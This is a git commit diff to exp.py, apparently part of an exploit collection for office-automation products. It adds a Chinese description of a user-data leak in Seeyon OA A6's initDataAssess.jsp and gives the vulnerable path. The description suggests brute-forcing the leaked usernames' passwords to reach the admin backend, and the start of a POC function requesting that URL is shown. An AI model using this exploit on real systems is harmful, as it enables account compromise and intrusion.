7c28d59898659d3b3458c99875a89a5fbfab6d24
Firebasky <63966847+Firebasky@users.noreply.github.com>
2021-03-29 12:12:30 +0800

    Update exp.py

--- OA产品漏洞/致远OA/致远OA A6 initDataAssess.jsp 用户敏感信息泄露/exp.py
+++ OA产品漏洞/致远OA/致远OA A6 initDataAssess.jsp 用户敏感信息泄露/exp.py
@@ -4,6 +4,13 @@ import random
 import re
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
+"""
+漏洞描述
+致远OA A6 initDataAssess.jsp 存在用户敏感信息泄露
+可以通过得到的用户名爆破用户密码进入后台进一步攻击
+漏洞影响:致远OA A6
+poc:url/yyoa/assess/js/initDataAssess.jsp
+"""
 
 def POC_1(target_url):
     vuln_url = target_url + "/yyoa/assess/js/initDataAssess.jsp"
